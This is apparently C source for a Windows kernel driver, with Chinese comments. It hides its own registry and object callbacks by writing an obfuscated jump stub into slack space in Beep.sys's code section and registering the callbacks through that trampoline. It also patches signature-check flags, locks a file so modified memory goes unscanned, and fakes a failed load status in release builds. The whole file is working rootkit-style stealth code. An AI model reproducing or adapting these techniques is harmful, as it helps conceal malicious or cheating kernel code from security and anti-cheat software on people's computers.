
#include "global.h"
#include "obcallback.h"
#include "cmpcallback.h"


//
//全局变量
//
PSYSTEM_ROUTINE_ADDRESS		g_pSysRotineAddr = NULL;

PVOID						g_shellcode = NULL;

PVOID						g_shellcode_pobj = NULL;

//
//引入其他变量
//
extern
LARGE_INTEGER				g_Regcookie;

extern
PVOID						g_obHandle;


//
//驱动卸载例程
//
void DriverUnload(
	_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	CmUnRegisterCallback(g_Regcookie);

	ObUnRegisterCallbacks(g_obHandle);

	if (g_pSysRotineAddr)
		ExFreePool(g_pSysRotineAddr);

	if (g_shellcode)
		ExFreePool(g_shellcode);

	if (g_shellcode_pobj)
		ExFreePool(g_shellcode_pobj);

}

//
//驱动默认响应操作
//
NTSTATUS DriverDefaultHandler(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

//
//安全拷贝内存
//
NTSTATUS RtlSuperCopyMemory(IN VOID UNALIGNED* Destination, IN CONST VOID UNALIGNED* Source, IN ULONG Length)
{
	//Change memory properties.
	PMDL g_pmdl = IoAllocateMdl(Destination, Length, 0, 0, NULL);
	if (!g_pmdl)
		return STATUS_UNSUCCESSFUL;
	MmBuildMdlForNonPagedPool(g_pmdl);
	unsigned int* Mapped = (unsigned int*)MmMapLockedPages(g_pmdl, KernelMode);
	if (!Mapped)
	{
		IoFreeMdl(g_pmdl);
		return STATUS_UNSUCCESSFUL;
	}
	KIRQL kirql = KeRaiseIrqlToDpcLevel();
	RtlCopyMemory(Mapped, Source, Length);
	KeLowerIrql(kirql);
	//Restore memory properties.
	MmUnmapLockedPages((PVOID)Mapped, g_pmdl);
	IoFreeMdl(g_pmdl);
	return STATUS_SUCCESS;
}


//
//锁定文件，防止被扫描到被修改的内存
//
void LockFile(wchar_t *filePath)
{
	UNICODE_STRING FileName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	RtlInitUnicodeString(&FileName, filePath);
	InitializeObjectAttributes(&ObjectAttributes, &FileName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL, NULL);

	HANDLE FileHandle;
	IO_STATUS_BLOCK IoStatusBlock;
	NTSTATUS NtStatus = ZwCreateFile(&FileHandle,
		GENERIC_READ,
		&ObjectAttributes,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, 0);
	if (NT_SUCCESS(NtStatus))
	{
		DbgPrint("LockFile ok!\n");
	}

}

//
//枚举 跳板驱动
//
PVOID EnumJumpDrv(
	_In_ PDRIVER_OBJECT		pDriverObject,
	_In_ PUNICODE_STRING	JumpSysName,
	_In_ PVOID address,
	_In_ ULONG count)
{
	PUCHAR				pJumpDrvBase = NULL;
	PIMAGE_DOS_HEADER	pDosHead;
	PIMAGE_NT_HEADERS	pNtHead;
	PIMAGE_SECTION_HEADER pSecHead;
	ULONG				AlignPageSize;
	ULONG				cResult1, cResult2;
	BOOLEAN				bFinded = FALSE;

	if (pDriverObject == NULL || address == NULL || count == 0)
	{
		return NULL;
	}


	//
	//寻找目标驱动
	//
	PLDR_DATA_TABLE_ENTRY64		entry = (PLDR_DATA_TABLE_ENTRY64)pDriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY64		first;

	first = entry;

	__try {
		do
		{
			if (entry->BaseDllName.Buffer != NULL)
			{
				if (RtlCompareUnicodeString(&entry->BaseDllName, JumpSysName, TRUE) == 0)
				{
					pJumpDrvBase = (PUCHAR)entry->DllBase;
					break;
				}
				entry = (PLDR_DATA_TABLE_ENTRY64)entry->InLoadOrderLinks.Blink;
			}


		} while (entry->InLoadOrderLinks.Blink != (ULONGLONG)first);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return NULL;
	}

	if (!pJumpDrvBase)
	{
		return NULL;
	}

	//
	//hook shellcode
	//

	UCHAR	hookCode[] = {
		0x53,
		0x48, 0xB8, 0xC7, 0x11, 0x62, 0xB3, 0x02, 0x01, 0x00, 0x00,
		0x48, 0xBB, 0x8E, 0xE3, 0x9D, 0x24, 0x1C, 0xCA, 0x00, 0x00,
		0x48, 0x33, 0xC3,
		0x5B,
		0x50,
		0xC3
	};



	pDosHead = (PIMAGE_DOS_HEADER)pJumpDrvBase;
	if (pDosHead->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}
	pNtHead = (PIMAGE_NT_HEADERS)\
		((LONG_PTR)pDosHead + pDosHead->e_lfanew);
	if (pNtHead->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}
	pSecHead = IMAGE_FIRST_SECTION(pNtHead);
	for (int i = 0; i < pNtHead->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((const char*)(pSecHead->Name), ".text") == 0)
		{
			bFinded = TRUE;
			break;
		}
		pSecHead++;
	}

	//
	//没有找到PAGE 页面
	//

	if (!bFinded)
	{
		DbgPrint("[BOOM] not find to name PAGE in the section.\n");
		return NULL;
	}

	//
	//妈的 这么6？
	//

	if (pSecHead->Misc.VirtualSize % PAGE_SIZE == 0)
	{
		DbgPrint("[BOOM] PAGE virtual size not align space.\n");
		return NULL;
	}

	AlignPageSize = ((pSecHead->Misc.VirtualSize / PAGE_SIZE) + 1) * PAGE_SIZE;

	cResult1 = AlignPageSize - pSecHead->Misc.VirtualSize;
	cResult2 = count * 0x20;
	if (cResult1 < cResult2)
	{
		DbgPrint("[BOOM] PAGE virtual size algin space not enough.\n");
		return NULL;
	}

	//
	//已经被hook了
	//
	pJumpDrvBase += pSecHead->VirtualAddress;
	pJumpDrvBase += AlignPageSize;
	pJumpDrvBase -= cResult2;

	if (*pJumpDrvBase == hookCode[0])
	{
		return NULL;
	}
	ULONG64 addr = (ULONG64)address;
	ULONG64 time, tick;
	ULONG64 xor_number;
	KeQuerySystemTime(&time);
	KeQueryTickCount(&tick);
	tick ^= time;
	xor_number = tick ^ addr;

	memcpy(&hookCode[3], &xor_number, sizeof(ULONG64));
	memcpy(&hookCode[13], &tick, sizeof(ULONG64));

	RtlSuperCopyMemory(pJumpDrvBase, hookCode, sizeof(hookCode));

	return pJumpDrvBase;

}


//
//初始化全局NTAPI 地址
//
NTSTATUS InitSystemRoutineAddress(
)
{
	NTSTATUS			status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING		routineName;

	g_pSysRotineAddr = \
		(PSYSTEM_ROUTINE_ADDRESS)ExAllocatePool(NonPagedPool, sizeof(SYSTEM_ROUTINE_ADDRESS));
	if (g_pSysRotineAddr == NULL)
	{
		return status;
	}
	g_pSysRotineAddr->ProtectPid = (HANDLE)-1;

	RtlInitUnicodeString(&routineName, L"PsGetCurrentProcessId");
	g_pSysRotineAddr->pfn_PsGetCurrentProcessId = \
		(fn_PsGetCurrentProcessId)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_PsGetCurrentProcessId == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"PsLookupProcessByProcessId");
	g_pSysRotineAddr->pfn_PsLookupProcessByProcessId = \
		(fn_PsLookupProcessByProcessId)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_PsLookupProcessByProcessId == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmIsAddressValid");
	g_pSysRotineAddr->pfn_MmIsAddressValid = \
		(fn_MmIsAddressValid)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmIsAddressValid == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"IoAllocateMdl");
	g_pSysRotineAddr->pfn_IoAllocateMdl = \
		(fn_IoAllocateMdl)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_IoAllocateMdl == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmBuildMdlForNonPagedPool");
	g_pSysRotineAddr->pfn_MmBuildMdlForNonPagedPool = \
		(fn_MmBuildMdlForNonPagedPool)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmBuildMdlForNonPagedPool == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmMapLockedPages");
	g_pSysRotineAddr->pfn_MmMapLockedPages = \
		(fn_MmMapLockedPages)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmMapLockedPages == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"IoFreeMdl");
	g_pSysRotineAddr->pfn_IoFreeMdl = \
		(fn_IoFreeMdl)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_IoFreeMdl == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"PsGetCurrentProcess");
	g_pSysRotineAddr->pfn_PsGetCurrentProcess = \
		(fn_PsGetCurrentProcess)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_PsGetCurrentProcess == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"KeStackAttachProcess");
	g_pSysRotineAddr->pfn_KeStackAttachProcess = \
		(fn_KeStackAttachProcess)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_KeStackAttachProcess == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"KeRaiseIrqlToDpcLevel");
	g_pSysRotineAddr->pfn_KeRaiseIrqlToDpcLevel = \
		(fn_KeRaiseIrqlToDpcLevel)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_KeRaiseIrqlToDpcLevel == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"RtlCopyMemory");
	g_pSysRotineAddr->pfn_RtlCopyMemory = \
		(fn_RtlCopyMemory)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_RtlCopyMemory == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"KeLowerIrql");
	g_pSysRotineAddr->pfn_KeLowerIrql = \
		(fn_KeLowerIrql)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_KeLowerIrql == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"KeUnstackDetachProcess");
	g_pSysRotineAddr->pfn_KeUnstackDetachProcess = \
		(fn_KeUnstackDetachProcess)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_KeUnstackDetachProcess == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmUnmapLockedPages");
	g_pSysRotineAddr->pfn_MmUnmapLockedPages = \
		(fn_MmUnmapLockedPages)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmUnmapLockedPages == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"ObDereferenceObject");
	g_pSysRotineAddr->pfn_ObDereferenceObject = \
		(fn_ObDereferenceObject)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_ObDereferenceObject == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"PsGetProcessWow64Process");
	g_pSysRotineAddr->pfn_PsGetProcessWow64Process = \
		(fn_PsGetProcessWow64Process)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_PsGetProcessWow64Process == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
	g_pSysRotineAddr->pfn_PsGetProcessPeb = \
		(fn_PsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_PsGetProcessPeb == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"PsGetProcessId");
	g_pSysRotineAddr->pfn_PsGetProcessId = \
		(fn_PsGetProcessId)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_PsGetProcessId == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmUnlockPages");
	g_pSysRotineAddr->pfn_MmUnlockPages = \
		(fn_MmUnlockPages)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmUnlockPages == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmProbeAndLockPages");
	g_pSysRotineAddr->pfn_MmProbeAndLockPages = \
		(fn_MmProbeAndLockPages)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmProbeAndLockPages == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"KeGetCurrentIrql");
	g_pSysRotineAddr->pfn_KeGetCurrentIrql = \
		(fn_KeGetCurrentIrql)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_KeGetCurrentIrql == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
	g_pSysRotineAddr->pfn_MmCopyVirtualMemory = \
		(fn_MmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_MmCopyVirtualMemory == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"RtlInitUnicodeString");
	g_pSysRotineAddr->pfn_RtlInitUnicodeString = \
		(fn_RtlInitUnicodeString)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_RtlInitUnicodeString == NULL)
	{
		return status;
	}

	RtlInitUnicodeString(&routineName, L"RtlCompareUnicodeString");
	g_pSysRotineAddr->pfn_RtlCompareUnicodeString = \
		(fn_RtlCompareUnicodeString)MmGetSystemRoutineAddress(&routineName);
	if (g_pSysRotineAddr->pfn_RtlCompareUnicodeString == NULL)
	{
		return status;
	}


	return STATUS_SUCCESS;
}



//
//驱动入口
//
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING  RegistryPath)
{

	//DbgBreakPoint();

	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS			status;
	PUCHAR				pRepRoutinePoint;
	UNICODE_STRING		altitude;
	UNICODE_STRING		DeviceName;

	//set callback functions
	DriverObject->DriverUnload = DriverUnload;
	for (unsigned int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = DriverDefaultHandler;


	//
	//先初始化地址
	//

	if (!NT_SUCCESS(InitSystemRoutineAddress()))
	{
		status = STATUS_APP_INIT_FAILURE;
		goto __exit;
	}

	//
	//初始化shellcode
	//

	g_shellcode = ExAllocatePool(NonPagedPool, PAGE_SIZE);
	if (!g_shellcode)
	{
		status = STATUS_MEMORY_NOT_ALLOCATED;
		goto __exit;
	}
	RtlSuperCopyMemory(g_shellcode, (PVOID)RegisterCallback, PAGE_SIZE);

	pRepRoutinePoint = (PUCHAR)g_shellcode;
	for (int i = 0; i < PAGE_SIZE - sizeof(ULONG64); i++)
	{
		if (pRepRoutinePoint[i] == 0x90 &&
			*(ULONG64*)(&pRepRoutinePoint[i]) == 0x9090909090909090)
		{
			PVOID	fined = &pRepRoutinePoint[i];
			RtlSuperCopyMemory(fined, &g_pSysRotineAddr, sizeof(g_pSysRotineAddr));
			break;
		}
	}
	//object hook
	g_shellcode_pobj = ExAllocatePool(NonPagedPool, PAGE_SIZE);
	if (!g_shellcode_pobj)
	{
		status = STATUS_MEMORY_NOT_ALLOCATED;
		goto __exit;
	}
	RtlSuperCopyMemory(g_shellcode_pobj, (PVOID)ObPreopCallback, PAGE_SIZE);

	pRepRoutinePoint = (PUCHAR)g_shellcode_pobj;
	for (int i = 0; i < PAGE_SIZE - sizeof(ULONG64); i++)
	{
		if (pRepRoutinePoint[i] == 0x90 &&
			*(ULONG64*)(&pRepRoutinePoint[i]) == 0x9090909090909090)
		{
			PVOID	fined = &pRepRoutinePoint[i];
			RtlSuperCopyMemory(fined, &g_pSysRotineAddr, sizeof(g_pSysRotineAddr));
			break;
		}
	}

	//
	//枚举其他驱动做跳板代码
	//

#ifndef DBG
	PVOID			FakeCallback, FakeCallback2;
	UNICODE_STRING	fakeDrv;

	RtlInitUnicodeString(&fakeDrv, L"Beep.sys");
	FakeCallback = EnumJumpDrv(DriverObject, &fakeDrv, g_shellcode, 1);
	FakeCallback2 = EnumJumpDrv(DriverObject, &fakeDrv, g_shellcode_pobj, 2);

	if (FakeCallback == NULL)
	{
		status = STATUS_ALIAS_EXISTS;
		goto __exit;
	}
#endif

	//
	//先激活object hook
	//
	RtlInitUnicodeString(&DeviceName, L"\\Driver\\Beep");

	PDRIVER_OBJECT pDriver = NULL;
	status = ObReferenceObjectByName(&DeviceName,
		OBJ_CASE_INSENSITIVE,
		NULL, FILE_ALL_ACCESS,
		*IoDriverObjectType,
		KernelMode, NULL,
		(PVOID*)&pDriver);

	if (NT_SUCCESS(status))
	{
		BypassCheckSign(DriverObject);
		BypassCheckSign(pDriver);
		ObDereferenceObject(pDriver);
	}
#if DBG
	ObRegiserCllabck((PVOID)ObPreopCallback);
#else
	ObRegiserCllabck(FakeCallback2);
#endif

	//
	//注册注册表回调
	//

	RtlInitUnicodeString(&altitude, L"396456");
#if DBG
	status = CmRegisterCallbackEx(
		(PEX_CALLBACK_FUNCTION)RegisterCallback,
		&altitude,
		DriverObject,
		NULL,
		&g_Regcookie,
		NULL);
#else
	status = CmRegisterCallbackEx(
		(PEX_CALLBACK_FUNCTION)FakeCallback,
		&altitude,
		DriverObject,
		NULL,
		&g_Regcookie,
		NULL);
#endif

	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	else
	{
		//
		//这里是全部操作成功，但我们得返回 0xC0000088 来标记以上工作全部成功
		//
#if DBG
		return STATUS_SUCCESS;
#else
		return STATUS_UNSUCCESSFUL;
#endif
	}

__exit:
	if (g_pSysRotineAddr)
		ExFreePool(g_pSysRotineAddr);
	if (g_shellcode)
		ExFreePool(g_shellcode);
	if (g_shellcode_pobj)
		ExFreePool(g_shellcode_pobj);

	return status;

	}
